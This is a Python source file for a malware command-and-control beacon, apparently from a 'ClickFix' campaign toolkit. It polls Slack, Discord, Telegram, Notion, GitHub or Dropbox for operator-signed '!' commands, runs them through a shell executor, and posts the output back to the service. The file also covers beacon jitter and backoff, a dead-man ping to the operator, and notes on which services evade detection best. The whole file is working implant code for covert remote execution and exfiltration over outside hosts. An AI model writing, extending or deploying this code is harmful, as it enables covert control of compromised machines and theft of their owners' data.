# language: Python 3.11+, file: cf/c2.py
# *legit-service C2 — beacon rides Slack/Discord/Telegram/Notion/GitHub/Dropbox*
from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json
import logging
import random
from collections.abc import Callable
from typing import Any, ClassVar

from .http import HttpClient, Rate, get_client
from .store import Store

LOG = logging.getLogger("clickfix.c2")


class C2TransportError(RuntimeError):
    """Raised when the channel itself is broken — the beacon counts these."""


SIG_MARK = ",sig="
SIG_HEX = 16


def sign_command(cmd: str, key: str) -> str:
    """Operator-side: wrap a payload so the implant executes exactly it and
    nothing else — without the key, a public channel is someone else's shell."""
    digest = hmac.new(
        key.encode("utf-8"), cmd.encode("utf-8"), hashlib.sha256
    ).hexdigest()[:SIG_HEX]
    return f"{cmd}{SIG_MARK}{digest}"


def verify_signed(text: str, key: str) -> bool:
    """Check a '!'-stripped command body carries a fresh signature."""
    head, sep, got = text.rpartition(SIG_MARK)
    if not sep or not head or len(got) != SIG_HEX:
        return False
    want = hmac.new(
        key.encode("utf-8"), head.encode("utf-8"), hashlib.sha256
    ).hexdigest()[:SIG_HEX]
    return hmac.compare_digest(got, want)


class LegitServiceC2:
    """Beacon traffic is TLS to a known CDN on a public endpoint: blocking it
    means breaking the service. Commands are messages starting with '!'.

    Every service sends the operator's real token — no placeholder auth.
    """

    SERVICES: ClassVar[dict[str, dict[str, Any]]] = {
        "slack": {
            "poll": "https://slack.com/api/conversations.history?channel={ch}&oldest={ts}",
            "send": "https://slack.com/api/chat.postMessage",
            "rate": (50, 60.0),
            "domain": "slack.com",
        },
        "discord": {
            "poll": "https://discord.com/api/v10/channels/{ch}/messages?limit=50&after={ts}",
            "send": "https://discord.com/api/v10/channels/{ch}/messages",
            "rate": (40, 60.0),
            "domain": "discord.com",
        },
        "telegram": {
            "poll": "https://api.telegram.org/bot{tok}/getUpdates?offset={ts}&timeout=20",
            "send": "https://api.telegram.org/bot{tok}/sendMessage",
            "rate": (30, 60.0),
            "domain": "api.telegram.org",
        },
        "notion": {
            "poll": "https://api.notion.com/v1/blocks/{ch}/children?page_size=50",
            "send": "https://api.notion.com/v1/blocks/{ch}/children",
            "rate": (3, 1.0),
            "domain": "api.notion.com",
        },
        "github": {
            "poll": "https://api.github.com/repos/{owner}/{repo}/contents/{path}",
            "send": "https://api.github.com/repos/{owner}/{repo}/contents/{path}",
            "rate": (30, 60.0),
            "domain": "api.github.com",
        },
        "dropbox": {
            "poll": "https://api.dropboxapi.com/2/files/download",
            "send": "https://content.dropboxapi.com/2/files/upload",
            "rate": (40, 60.0),
            "domain": "dropboxapi.com",
        },
    }

    def __init__(
        self,
        store: Store,
        campaign_id: str,
        service: str,
        token: str,
        channel: str = "",
        repo: str = "",
        path: str = "beacon.json",
        http: HttpClient | None = None,
    ) -> None:
        self.store = store
        self.cid = campaign_id
        self.service = service
        self.token = token
        self.channel = channel
        self.repo = repo
        self.path = path
        self.spec = self.SERVICES.get(service)
        if not self.spec:
            raise ValueError(f"unsupported service: {service}")
        self.http = http or get_client()
        limit, period = self.spec.get("rate", (30, 60.0))
        self.rate = Rate(limit, period)
        self._seen: dict[str, None] = {}  # ordered set — insertion order eviction
        self.cursor: str = "0"
        self.last_error: str = ""

    # ─── transport ───
    def _url(self, key: str, ts: str = "0") -> str:
        owner, _, name = self.repo.partition("/")
        return (
            self.spec[key]
            .replace("{ch}", self.channel)
            .replace("{ts}", ts)
            .replace("{owner}", owner)
            .replace("{repo}", name)
            .replace("{path}", self.path)
        )

    def _headers(self) -> dict[str, str]:
        if self.service == "telegram":
            return {"User-Agent": ""}
        if self.service == "discord":
            return {"Authorization": f"Bot {self.token}"}
        hdrs: dict[str, str] = {"Authorization": f"Bearer {self.token}"}
        if self.service == "notion":
            hdrs["Notion-Version"] = "2022-06-28"
        if self.service == "github":
            hdrs["Accept"] = "application/vnd.github+json"
            hdrs["X-GitHub-Api-Version"] = "2022-11-28"
        return hdrs

    async def _call(
        self, method: str, url: str, **kw: Any
    ) -> dict[str, Any]:
        headers = {k: v for k, v in self._headers().items() if v}
        headers.update(kw.pop("headers", {}))
        res = await self.http.request(
            method,
            url,
            headers=headers,
            rate=self.rate,
            rate_key=f"c2:{self.service}",
            **kw,
        )
        if res.get("status", 0) == 0:
            self.last_error = str(res.get("error"))
            raise C2TransportError(self.last_error)
        if res["status"] >= 400:
            body = res.get("body")
            snippet = body if isinstance(body, str) else json.dumps(body)[:300]
            self.last_error = f"HTTP {res['status']}: {snippet}"
            raise C2TransportError(self.last_error)
        self.last_error = ""
        return res

    # ─── inbound ───
    @staticmethod
    def _max_ts(prev: str, cand: str) -> str:
        "Cursor advance — numeric compare where both sides are ids-as-strings."
        try:
            a, b = float(prev), float(cand)
        except ValueError:
            return cand if cand > prev else prev
        return cand if b > a else prev

    def _remember(self, key: str) -> bool:
        "True if key is new. Bounded: the oldest id drops out past 1000."
        if key in self._seen:
            return False
        self._seen[key] = None
        if len(self._seen) > 1000:
            first = next(iter(self._seen))
            self._seen.pop(first, None)
        return True

    async def poll(self, last_ts: str = "0") -> list[dict[str, Any]]:
        """Fetch pending '!command' messages. Raises C2TransportError on a
        dead channel so the beacon can count failures instead of sleeping
        through them. Advances self.cursor past every item seen on this
        poll — command or not — so quiet channels never re-read history."""
        cursor = last_ts
        if self.service == "telegram":
            offset = str(int(last_ts) + 1) if last_ts.isdigit() else "0"
            res = await self._call("GET", self._url("poll", offset), expect_json=True)
            raw = res.get("body") or {}
            if not isinstance(raw, dict) or not raw.get("ok", True):
                raise C2TransportError(f"telegram: {raw!r}"[:300])
            items = raw.get("result", [])
            for u in items or []:
                cursor = self._max_ts(cursor, str(u.get("update_id", "")))
        elif self.service == "github":
            try:
                res = await self._call("GET", self._url("poll"), expect_json=True)
            except C2TransportError as exc:
                # file absent on a cold channel is an empty inbox, not a
                # dead channel
                if "404" in str(exc) or "not found" in str(exc).lower():
                    items = []
                else:
                    raise
            else:
                items = [res.get("body") or {}]
            entry = items[0] if items else {}
            cursor = self._max_ts(cursor, str(entry.get("sha", "")))
        elif self.service == "dropbox":
            items = [await self._dropbox_read()]
        else:
            res = await self._call("GET", self._url("poll", last_ts), expect_json=True)
            body = res.get("body")
            if isinstance(body, dict) and "messages" not in body:
                problem = body.get("error") or body.get("message")
                if problem and body.get("ok") is not True:
                    raise C2TransportError(f"{self.service}: {problem}")
            if isinstance(body, dict):
                items = body.get(
                    "messages", body.get("results", [])
                )
            else:
                items = body if isinstance(body, list) else []
            for m in items or []:
                iid = m.get("ts") or m.get("id") or ""
                if iid:
                    cursor = self._max_ts(cursor, str(iid))
        commands = self._parse_commands(items)
        fresh = [c for c in commands if self._remember(c["ts"])]
        for c in fresh:
            cursor = self._max_ts(cursor, c["ts"])
        self.cursor = cursor
        return fresh

    def _parse_commands(self, items: Any) -> list[dict[str, Any]]:
        out: list[dict[str, Any]] = []
        if self.service == "slack":
            for m in items or []:
                text = m.get("text", "")
                if text.startswith("!"):
                    out.append({"ts": str(m.get("ts", "")), "cmd": text})
        elif self.service == "discord":
            for m in items or []:
                text = m.get("content", "")
                if text.startswith("!"):
                    out.append({"ts": str(m.get("id", "")), "cmd": text})
        elif self.service == "telegram":
            for u in items or []:
                text = (u.get("message") or {}).get("text", "")
                if text.startswith("!"):
                    out.append(
                        {"ts": str(u.get("update_id", "")), "cmd": text}
                    )
        elif self.service == "notion":
            for block in items or []:
                if block.get("type") != "paragraph":
                    continue
                text = "".join(
                    rt.get("plain_text", "")
                    for rt in block.get("paragraph", {}).get("rich_text", [])
                )
                if text.startswith("!"):
                    out.append({"ts": str(block.get("id", "")), "cmd": text})
        elif self.service == "github":
            entry = items[0] if items else {}
            if entry.get("type") == "file" and entry.get("content"):
                try:
                    text = base64.b64decode(
                        entry["content"].replace("\n", "")
                    ).decode("utf-8", "replace")
                except Exception:  # noqa: BLE001
                    text = ""
                sha = str(entry.get("sha", ""))
                for line in text.splitlines():
                    if line.startswith("!"):
                        # every line in a file shares one sha — the dedup id
                        # must include the line content or a second command is
                        # invisible until the file changes
                        digest = hashlib.blake2s(
                            line.encode("utf-8"), digest_size=8
                        ).hexdigest()
                        out.append({"ts": f"{sha}:{digest}", "cmd": line})
        elif self.service == "dropbox":
            text = items[0] if items and isinstance(items[0], str) else ""
            for line in text.splitlines():
                if line.startswith("!"):
                    digest = hashlib.blake2s(
                        line.encode("utf-8"), digest_size=8
                    ).hexdigest()
                    out.append({"ts": f"line:{digest}", "cmd": line})
        return out

    async def _dropbox_read(self) -> str:
        try:
            res = await self._call(
                "POST",
                "https://api.dropboxapi.com/2/files/download",
                json_body=None,
                headers={
                    "Dropbox-API-Arg": json.dumps({"path": f"/{self.path}"})
                },
            )
        except C2TransportError as exc:
            if "not_found" in str(exc):
                return ""  # no command file yet — not a channel failure
            raise
        body = res.get("body")
        return body if isinstance(body, str) else ""

    # ─── outbound ───
    async def send(self, output: str, bid: str = "") -> dict[str, Any]:
        payload = f"[{bid}] {output[:3500]}"
        if self.service == "dropbox":
            res = await self._call(
                "POST",
                self.spec["send"],
                headers={
                    "Dropbox-API-Arg": json.dumps(
                        {"path": f"/{bid or 'beacon'}.txt", "mode": "overwrite"}
                    ),
                    "Content-Type": "application/octet-stream",
                },
                data=payload.encode("utf-8"),
            )
            return {"status": res["status"], "ok": res.get("ok")}

        if self.service == "slack":
            body: dict[str, Any] = {"channel": self.channel, "text": payload}
        elif self.service == "discord":
            body = {"content": payload}
        elif self.service == "telegram":
            body = {"chat_id": self.channel, "text": payload}
        elif self.service == "notion":
            body = {
                "children": [
                    {
                        "object": "block",
                        "type": "paragraph",
                        "paragraph": {
                            "rich_text": [
                                {
                                    "type": "text",
                                    "text": {"content": payload},
                                }
                            ]
                        },
                    }
                ]
            }
        elif self.service == "github":
            body = await self._github_update(payload)
        else:
            return {"error": f"unknown service {self.service}"}

        res = await self._call("POST", self._url("send"), json_body=body)
        return {"status": res["status"], "ok": res.get("ok"),
                "body": str(res.get("body"))[:300]}

    async def _github_update(self, payload: str) -> dict[str, Any]:
        """Contents API needs the current sha — a blind PUT 409s on try #2."""
        args: dict[str, Any] = {
            "message": f"update {payload[:40]}",
            "content": base64.b64encode(payload.encode("utf-8")).decode(),
        }
        try:
            res = await self._call("GET", self._url("poll"), expect_json=True)
        except C2TransportError as exc:
            # first write against an absent file has no sha to burn
            if "404" in str(exc) or "not found" in str(exc).lower():
                return args
            raise
        entry = res.get("body") or {}
        if isinstance(entry, dict) and entry.get("sha"):
            args["sha"] = entry["sha"]
        return args

    # ─── loop ───
    async def run_beacon(
        self,
        bid: str,
        executor: Callable[[str], str],
        poll_interval: float = 60.0,
        jitter: float = 0.3,
        max_failures: int = 8,
        deadman_url: str = "",
    ) -> None:
        """poll → exec → send, with jitter, exponential backoff on a broken
        channel, a dead-man ping when the channel dies, and a clean state
        transition on cancellation."""
        self.store.set_beacon_state(bid, "beaconed", self.cid)
        last_ts = "0"
        failures = 0
        try:
            while True:
                delay = poll_interval
                try:
                    commands = await self.poll(last_ts)
                    # poll advances cursor past everything seen, quiet or not
                    last_ts = self.cursor
                    failures = 0
                except asyncio.CancelledError:
                    raise
                except Exception as exc:  # noqa: BLE001 — any channel or parse
                    # failure is the same counter: C2TransportError, json
                    # junk from a hand-edited channel, a KeyError from a
                    # schema change — all mean "this tick is dead"
                    failures += 1
                    LOG.warning(
                        "beacon %s channel failure %d/%d: %s",
                        bid,
                        failures,
                        max_failures,
                        exc,
                    )
                    if failures >= max_failures:
                        self.store.set_beacon_state(bid, "dead", self.cid)
                        if deadman_url:
                            await self._fire_deadman(deadman_url, bid)
                        return
                    delay = min(poll_interval * (2**failures), 1800.0)
                    commands = []
                for cmd in commands:
                    text = cmd["cmd"][1:]
                    # command text crosses into a shell — keep it bounded
                    out = ""
                    try:
                        out = await asyncio.to_thread(executor, text[:4000])
                    except Exception as exc:  # noqa: BLE001
                        out = f"error: {type(exc).__name__}: {exc}"
                    try:
                        await self.send(out, bid)
                    except C2TransportError as exc:
                        LOG.warning("send failed for %s: %s", bid, exc)
                    self.store.log_event(
                        bid, self.cid, "c2_exec", json.dumps(
                            {"cmd": text[:200], "len": len(out)}
                        )
                    )
                sleep = delay * (1 + random.uniform(-jitter, jitter))
                await asyncio.sleep(max(sleep, 1.0))
        except asyncio.CancelledError:
            self.store.set_beacon_state(bid, "stopped", self.cid)
            raise

    async def _fire_deadman(self, url: str, bid: str) -> None:
        """Last resort: one GET to tell the operator this implant is done."""
        from .http import get_client

        try:
            client = get_client()
            res = await client.request("GET", url, retries=0, timeout=10)
            if not res.get("ok"):
                LOG.warning(
                    "dead-man ping answered with HTTP %s for %s",
                    res.get("status"),
                    bid,
                )
                return
            self.store.log_event(
                bid, self.cid, "deadman", json.dumps({"url": url[:200]})
            )
            LOG.warning("beacon %s fired dead-man ping", bid)
        except Exception as exc:  # noqa: BLE001
            LOG.warning("dead-man ping failed for %s: %s", bid, exc)

    @staticmethod
    def privacy_notes() -> dict[str, Any]:
        return {
            "slack": {
                "channel": "every member sees the history",
                "detection": "Slack flags unusual bot tokens",
            },
            "discord": {
                "detection": "Trust & Safety watches unverified bots",
                "rate": "~50 req/min per bot",
            },
            "telegram": {
                "detection": "no content inspection on bot traffic",
                "note": "best signal-to-noise of the set",
            },
            "notion": {
                "detection": "integration access is logged",
                "rate": "3 req/s",
            },
            "github": {
                "detection": "abuse detection on frequent commits",
                "note": "commit diffs are public unless the repo is private",
            },
            "dropbox": {
                "detection": "normal API traffic, low noise",
                "note": "content is encrypted at rest",
            },
        }
